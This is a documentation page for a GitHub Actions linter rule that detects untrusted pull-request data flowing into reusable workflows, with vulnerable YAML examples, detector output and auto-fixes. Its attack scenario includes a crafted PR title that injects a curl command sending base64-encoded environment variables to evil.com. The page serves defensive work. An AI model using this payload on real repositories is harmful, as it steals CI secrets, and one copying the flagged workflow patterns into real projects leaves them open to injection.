---
title: "Reusable Workflow Taint Rule"
weight: 42
---

### Reusable Workflow Taint Rule Overview

This rule detects security vulnerabilities that arise when **untrusted inputs are passed to reusable workflows** and subsequently used in dangerous contexts within those workflows.

#### Key Features:

- **Cross-Workflow Taint Tracking**: Tracks untrusted data as it flows from caller to callee workflows
- **Two-Phase Detection**: Flags both the caller passing untrusted data AND the callee using it unsafely
- **Severity-Based Reporting**: Critical severity for privileged triggers, medium for normal triggers
- **Auto-fix Support**: Automatically converts unsafe patterns to use environment variables

### Security Impact

**Severity: Critical (privileged triggers) / Medium (normal triggers)**

Reusable workflow taint propagation is particularly dangerous because:

1. **Hidden Attack Surface**: The dangerous code may not be visible in the calling workflow
2. **Privilege Escalation**: Untrusted data can reach code running with elevated permissions
3. **Supply Chain Risk**: Compromised reusable workflows affect all callers
4. **Audit Complexity**: Security review must span multiple workflow files

This vulnerability is classified as **CWE-94: Improper Control of Generation of Code** with additional **CWE-20: Improper Input Validation** components.

### Attack Scenario

**How the Attack Works:**

1. **Attacker creates malicious PR** with crafted title:
   ```
   Title: "; curl https://evil.com/$(env|base64) #
   ```

2. **Caller workflow passes untrusted input to reusable workflow**:
   ```yaml
   # caller.yml
   on: pull_request_target
   jobs:
     process:
       uses: ./.github/workflows/processor.yml
       with:
         title: ${{ github.event.pull_request.title }}  # TAINTED
   ```

3. **Reusable workflow uses the tainted input unsafely**:
   ```yaml
   # processor.yml
   on:
     workflow_call:
       inputs:
         title:
           required: true
           type: string
   jobs:
     run:
       steps:
         - run: echo "Processing: ${{ inputs.title }}"  # CODE INJECTION
   ```

4. **Result**: Command injection with privileges of the privileged workflow

### Example Vulnerable Workflow

#### Caller Workflow (Vulnerability Origin)

```yaml
name: Auto-process PRs

on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  process-pr:
    uses: ./.github/workflows/pr-processor.yml
    with:
      # VULNERABLE: Passing untrusted PR data to reusable workflow
      pr_title: ${{ github.event.pull_request.title }}
      pr_body: ${{ github.event.pull_request.body }}
      head_ref: ${{ github.head_ref }}
```

#### Callee Workflow (Vulnerability Manifestation)

```yaml
name: PR Processor

on:
  workflow_call:
    inputs:
      pr_title:
        required: true
        type: string
      pr_body:
        required: false
        type: string
      head_ref:
        required: true
        type: string

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      # VULNERABLE: Using tainted inputs in run script
      - name: Log PR info
        run: |
          echo "Title: ${{ inputs.pr_title }}"
          echo "Branch: ${{ inputs.head_ref }}"

      # VULNERABLE: Using tainted inputs in github-script
      - uses: actions/github-script@v7
        with:
          script: |
            console.log('Body: ${{ inputs.pr_body }}');
```

### Example Output

Running sisakulint will detect both the tainted input passing and unsafe usage:

**Caller workflow detection:**
```bash
$ sisakulint .github/workflows/caller.yml

.github/workflows/caller.yml:10:20: reusable workflow input taint (critical): input "pr_title" receives untrusted value "github.event.pull_request.title" which may be used unsafely in the called workflow "./.github/workflows/pr-processor.yml". Consider validating or sanitizing the input. [reusable-workflow-taint]
```

**Callee workflow detection:**
```bash
$ sisakulint .github/workflows/pr-processor.yml

.github/workflows/pr-processor.yml:24:20: tainted input in reusable workflow: "inputs.pr_title" may contain untrusted data passed from the caller workflow. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. [reusable-workflow-taint]
```

### Auto-fix Support

The reusable-workflow-taint rule supports auto-fixing by converting unsafe patterns in the callee workflow:

```bash
# Preview changes
sisakulint -fix dry-run

# Apply fixes
sisakulint -fix on
```

#### Before (Vulnerable)

```yaml
on:
  workflow_call:
    inputs:
      pr_title:
        type: string
jobs:
  process:
    steps:
      - run: echo "Title: ${{ inputs.pr_title }}"
```

#### After (Secure)

```yaml
on:
  workflow_call:
    inputs:
      pr_title:
        type: string
jobs:
  process:
    steps:
      - run: echo "Title: $INPUT_PR_TITLE"
        env:
          INPUT_PR_TITLE: ${{ inputs.pr_title }}
```

### Best Practices

#### 1. Validate Inputs at the Caller Level

If you must pass user-controlled data, validate it first:

```yaml
jobs:
  validate-and-call:
    runs-on: ubuntu-latest
    steps:
      - name: Validate PR title
        id: validate
        run: |
          TITLE="${{ github.event.pull_request.title }}"
          # Strip potentially dangerous characters
          SAFE_TITLE=$(echo "$TITLE" | tr -cd '[:alnum:] ._-')
          echo "safe_title=$SAFE_TITLE" >> $GITHUB_OUTPUT
        env:
          TITLE: ${{ github.event.pull_request.title }}

  call-workflow:
    needs: validate-and-call
    uses: ./.github/workflows/processor.yml
    with:
      # Pass validated value instead
      title: ${{ needs.validate-and-call.outputs.safe_title }}
```

#### 2. Use Environment Variables in Reusable Workflows

Always pass inputs through environment variables:

```yaml
# In reusable workflow
jobs:
  process:
    steps:
      - run: |
          echo "Title: $TITLE"
          # Safe to use $TITLE in shell operations
        env:
          TITLE: ${{ inputs.pr_title }}
```

#### 3. Avoid Passing User-Controlled Data

When possible, pass only safe, computed values:

```yaml
jobs:
  call-workflow:
    uses: ./.github/workflows/processor.yml
    with:
      # SAFE: These are not user-controlled
      sha: ${{ github.sha }}
      run_id: ${{ github.run_id }}
      repo: ${{ github.repository }}
```

#### 4. Document Expected Input Format

In your reusable workflow, document what inputs are expected:

```yaml
on:
  workflow_call:
    inputs:
      pr_number:
        description: 'PR number (integer only, no user-controlled strings)'
        required: true
        type: number  # Type enforcement helps
      label:
        description: 'Label to add (alphanumeric only)'
        required: true
        type: string
```

### Untrusted Input Sources

The following sources are considered untrusted when passed to reusable workflows:

**Pull Request Data:**
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref`
- `github.event.pull_request.head.label`
- `github.event.pull_request.head.sha`

**Issue Data:**
- `github.event.issue.title`
- `github.event.issue.body`

**Comment Data:**
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.review_comment.body`

**Other:**
- `github.head_ref`
- `github.event.discussion.title`
- `github.event.discussion.body`
- `github.event.head_commit.message`
- `github.event.commits.*.message`

### Safe vs. Unsafe Usage Patterns

#### Unsafe Patterns (Detected)

```yaml
# Direct usage in run script
- run: echo "${{ inputs.title }}"

# Direct usage in github-script
- uses: actions/github-script@v7
  with:
    script: console.log('${{ inputs.body }}')

# Usage in shell variable assignment
- run: |
    TITLE="${{ inputs.title }}"
    process_pr "$TITLE"
```

#### Safe Patterns (Not Flagged)

```yaml
# Using environment variables
- run: echo "$TITLE"
  env:
    TITLE: ${{ inputs.title }}

# Input is from trusted source (not flagged in caller)
- uses: ./processor.yml
  with:
    sha: ${{ github.sha }}  # Trusted

# Input is already in env in caller
- run: echo "$TITLE"
  env:
    TITLE: ${{ inputs.title }}  # Environment variable indirection
```

### Severity Classification

| Caller Trigger | Severity | Reason |
|----------------|----------|--------|
| `pull_request_target` | Critical | Write access + secrets |
| `workflow_run` | Critical | Elevated privileges |
| `issue_comment` | Critical | Secrets access |
| `pull_request` | Medium | Read-only, limited scope |
| `push` | Medium | Only trusted commits |

### Complementary Rules

Use these rules together for comprehensive protection:

1. **code-injection-critical/medium**: Direct untrusted input detection
2. **envvar-injection-critical/medium**: $GITHUB_ENV injection detection
3. **untrusted-checkout**: Dangerous checkout patterns
4. **permissions**: Limit workflow permissions

### Detection Logic

The rule performs two types of analysis:

1. **Caller Analysis**: Checks if untrusted expressions are passed via `with:` to reusable workflows

2. **Callee Analysis**: In workflows with `workflow_call` trigger, checks if `inputs.*` are used in:
   - `run:` scripts (shell context)
   - `actions/github-script` `script:` parameter (JavaScript context)

### Performance

- **Detection**: O(n) where n is the number of jobs and steps
- **Cross-file Analysis**: Each file is analyzed independently
- **No External Calls**: Purely static analysis

### See Also

**Related Rules:**
- [Code Injection Critical]({{< ref "codeinjectioncritical.md" >}})
- [Code Injection Medium]({{< ref "codeinjectionmedium.md" >}})
- [Untrusted Checkout]({{< ref "untrustedcheckout.md" >}})

**Industry References:**
- [GitHub: Reusing Workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows)
- [GitHub: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [CodeQL: Code Injection](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/)

{{< popup_link2 href="https://docs.github.com/en/actions/using-workflows/reusing-workflows" >}}

{{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions" >}}

{{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/" >}}
